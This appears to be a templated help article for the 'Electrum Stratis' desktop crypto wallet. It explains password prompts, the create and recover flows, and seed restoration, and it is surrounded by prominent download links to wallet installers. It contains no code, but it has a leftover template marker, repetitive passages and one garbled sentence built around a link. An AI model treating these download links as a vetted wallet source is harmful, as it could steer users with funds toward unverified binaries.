![Electrum-Stratis](assets/banner-article.png)

# Password prompts you cannot satisfy: why they appear and what unlocks them

<p align="center">Create and Recover ask different things</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A password prompt in Electrum Stratis means the wallet file in front of you is encrypted and the application needs its key before it will open or send. If you never set a password, the usual explanation is that the file belongs to a different wallet, was restored with encryption, or the application is asking to create a password for a new file rather than to open an old one. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you see | What it usually means | Route |
|---|---|---|
| "Incorrect password" on a file you never encrypted | Different wallet file, or a password set and forgotten | Check the file, then the seed |
| A prompt when sending, after the wallet opened fine | Sending requires unlocking the encrypted file | Enter the password once |
| A prompt at launch with no Create option | You opened an existing encrypted wallet | The seed is the way back |
| A prompt asking you to choose a password | You are creating a new wallet, not opening one | Back out and choose Recover |

</div>

The distinction between "choose a password" and "enter a password" is the single most useful tell: the first means a new wallet is being created, the second means an existing file is locked.

## Why it happens

Encryption is per file, not per installation. The wallet does not know who you are; it knows whether the file it was pointed at can be decrypted. That is why a fresh install can greet you with a prompt - it has been pointed at an existing wallet - and why a wallet that opened yesterday can demand a password today if the machine was rebooted or the session locked.

Sending is a second, separate unlock. Some flows keep the wallet open for reading and require the password again to sign, which is deliberate: a machine left unattended should not be able to move funds.

The maintained build, current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), detects the backup model before asking for anything, so "choose a password" for a wallet you did not create is a signal rather than a dead end.

The password encrypts the wallet file at rest; it does not create an account and it is not held anywhere else. A prompt therefore means the file in front of you is encrypted, and it can only be satisfied by the password chosen when that file was written. A second prompt during a send is the application asking again before it signs, which is a deliberate boundary rather than a forgotten setting.

## Fix

1. **Read the prompt's verb.** If it asks you to choose a password, you are in the create flow: cancel, choose Recover, and restore the wallet you meant to open.
2. **Check which file is open.** A second `.dat` from an older install is the most common cause of "incorrect password" on a wallet you thought you knew.
3. **Try the layouts you actually used.** Keyboard layout and capitalisation are the two silent differences between the password you remember and the password you typed at creation.
4. **If the password is truly gone, use the seed.** A restore writes a new file with a new password, and the old one is never needed for that route.
5. **Unlock deliberately when sending.** Enter the password once at the signing step; if the wallet offers to remember it for the session, decide consciously whether that machine is safe enough.

If the prompt appears only when sending, nothing is wrong: the wallet is protecting the signing step, and the same password that opened the file will satisfy it. That second unlock is deliberate - [is Electrum Stratis safe](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md) means a machine left unattended should not be able to move funds.

## If that did not work

If every password fails and the file was created recently, confirm that the file is the one you think it is by checking its location and modification date. A restored or copied wallet can sit beside the original and be opened by accident.

If the wallet opens but sending always fails at the password step, the file may have been opened read-only or with a session that cannot sign - reopening the wallet and unlocking once resolves it.

If you have no password and no seed and the file is encrypted, the file can only be tested against candidates. That is a search, not a recovery, and its outcome depends on the password being among the candidates.

## Prevention

- Record which password belongs to which wallet file, somewhere separate from the file.
- Use one passphrase you can retype, not a different invention per wallet.
- Name wallet files so a second file is obvious rather than surprising.
- Test a restore before the wallet holds anything important.
- Do not let a browser or a password manager autofill a wallet password into the wrong field.

## FAQ

### Incorrect password, and I cannot find "create a new wallet". What now?

You are being shown an existing encrypted wallet, so the create option is not offered. Cancel the prompt, choose Recover instead, and restore from the seed - that path creates a new wallet file and lets you set a fresh password.

### Why does sending prompt me for a password I do not have?

Because signing needs the file's decryption key, and if you did not set one, this file is not the wallet you think it is. Check which file is open; if it is the right file, the password exists and is recoverable only by memory, candidates, or the seed.

### Can I remove the password from a wallet?

A wallet restored without encryption has no password, which is convenient and less safe. The better answer for a machine you control is a passphrase you can retype, plus a screen lock, rather than an unencrypted file.

### Does a wrong password damage the wallet?

No. A failed attempt changes nothing; the file is not modified by a wrong guess. There is no lockout and no penalty, which is also why candidates can be tested at length.

<!-- DOWNLOAD-BLOCK -->

Before assuming the worst, establish which file is open. The title bar and the recent-wallets list name it, and the path is visible in the window. A prompt on a file you copied from another machine is expected. A prompt on a file you created today is not, and usually means a second wallet was opened by mistake.

## Related articles

- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
- [The .dat file that is not in your folder](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/wallet-file-not-in-the-folder.md)
- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
